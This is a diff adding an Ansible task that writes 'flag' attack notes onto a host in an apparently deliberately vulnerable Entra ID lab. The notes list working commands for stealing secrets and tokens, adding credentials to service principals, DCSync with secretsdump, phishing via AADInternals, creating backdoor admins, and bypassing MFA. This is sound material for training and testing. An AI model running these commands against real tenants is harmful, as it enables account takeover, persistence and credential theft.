@@ -1,0 +1,118 @@
+---
+# ==============================================================================
+# vuln_cloud_entra/tasks/cloud_notes.yml — CLO-041..100
+# Target: dc01.corp.local
+#
+# CLO-041..060: Entra ID app registration attack surfaces
+# CLO-061..080: Conditional Access bypass and token abuse
+# CLO-081..100: Advanced cloud attack chains
+# ==============================================================================
+
+- name: CLO-041..100 - Drop Entra ID app registration attack notes
+  ansible.windows.win_copy:
+    dest: "{{ item.path }}"
+    content: "{{ item.content }}"
+  loop:
+    - path: 'C:\Flags\FLAG-CLO-041-AppReg-ClientSecret.txt'
+      content: |
+        CLO-041: Entra ID App Registration Client Secret Theft
+        ========================================================
+        App registrations with client secrets stored in:
+          - Azure Key Vault (accessible if VM MSI has vault access)
+          - Environment variables on VM (check C:\Windows\System32\drivers\etc\hosts
+            for deployed app configs)
+          - .env files, appsettings.json, web.config on IIS
+
+        Enumerate: az ad app list --all
+        Attack: Use stolen client_id + client_secret for OAuth client_credentials flow
+        Scope: .default or specific API permissions
+
+    - path: 'C:\Flags\FLAG-CLO-055-ServicePrincipal.txt'
+      content: |
+        CLO-055: Entra ID Service Principal Abuse
+        ==========================================
+        Service principals with high permissions:
+          - Application.ReadWrite.All → add client secret → read all app secrets
+          - Directory.ReadWrite.All → create admin users
+          - RoleManagement.ReadWrite.Directory → grant GA to attacker
+
+        Enumeration:
+          roadrecon gather
+          az ad sp list --all | jq '.[] | select(.appRoles != [])'
+
+        Attack: Add credential to existing SP with high permissions
+          Import-Module AzureAD
+          New-AzureADServicePrincipalPasswordCredential -ObjectId <SP_ID> -Value 'Pwned123!'
+
+    - path: 'C:\Flags\FLAG-CLO-061-CA-Bypass.txt'
+      content: |
+        CLO-061: Conditional Access Policy Bypass Techniques
+        =====================================================
+        Common CA bypass methods:
+          1. Legacy auth protocols (IMAP, POP3, SMTP AUTH) — not covered by CA
+          2. Device compliance bypass via compliant device spoofing
+          3. Named location bypass (trusted IP range spoofing)
+          4. Break-glass account (excluded from CA policies)
+          5. Managed identity token to bypass CA
+
+        Testing:
+          AADInternals: Invoke-AADIntPhishing -Recipients jim.halpert@corp.local \
+            -Subject "Password Reset" -LinkText "Reset Password" -Sender "it@corp.local"
+
+    - path: 'C:\Flags\FLAG-CLO-071-TokenAbuse.txt'
+      content: |
+        CLO-071: Azure Token Theft and Replay
+        =======================================
+        Access tokens (JWT) are valid for 1 hour by default. Refresh tokens up to 24h.
+        PRT (Primary Refresh Token) up to 14 days.
+
+        Token sources:
+          - Azure CLI: ~/.azure/accessTokens.json
+          - Az PowerShell: $env:USERPROFILE\.Azure\TokenCache.dat
+          - Browser: developer tools → Application → Cookies → .ASPXAUTH, ESTSAUTH
+
+        Replay:
+          TokenTactics: Invoke-RefreshToMSGraphToken -RefreshToken <rt> -tenantid <tid>
+          roadrecon auth --access-token <at> --refresh-token <rt>
+
+    - path: 'C:\Flags\FLAG-CLO-081-HybridChain.txt'
+      content: |
+        CLO-081: On-Prem → Cloud Escalation Chain
+        ==========================================
+        Full attack chain: compromise on-prem AD → pivot to Entra ID
+
+        Step 1: DCSync via MSOL_sync account (CLO-002)
+          impacket-secretsdump CORP/MSOL_sync:EntraSync2024!@10.10.0.10
+
+        Step 2: Crack/use Administrator NT hash for Pass-the-Hash
+
+        Step 3: Extract Entra Connect DKMS key from DC (AADInternals)
+          Get-AADIntSyncCredentials -Server dc01.corp.local
+          → Returns Entra ID tenant credentials
+
+        Step 4: Access Entra ID with Global Admin
+          Connect-AzureAD -TenantId {{ entra_tenant_id }} -AccountId admin@corplab.onmicrosoft.com
+
+        Step 5: Create Entra ID backdoor / export all cloud user hashes
+
+    - path: 'C:\Flags\FLAG-CLO-091-AADInternals.txt'
+      content: |
+        CLO-091: AADInternals Toolkit Attacks
+        ========================================
+        AADInternals (github.com/Gerenios/AADInternals) enables:
+
+        CLO-091: Kill AD sync → all Entra ID users lose cloud auth → ransomware-style
+          Set-AADIntPassThroughAuthenticationEnabled -Enabled $false
+
+        CLO-092: Create backdoor admin user in Entra ID
+          New-AADIntUser -UserPrincipalName backdoor@corplab.onmicrosoft.com \
+            -Password BackdoorPwd1 -DisplayName Backdoor -UserType Member
+
+        CLO-093: Set temporary access pass (bypass MFA)
+          New-AADIntUserTemporaryAccessPass -UserPrincipalName victim@corplab.onmicrosoft.com
+
+        CLO-094: Extract Entra ID join device certificates
+          Get-AADIntHybridDeviceCertificate
+
+        CLO-095: Pass-the-PRT
+          Get-AADIntPRTToken -DeviceID <id> -Certificate <cert>
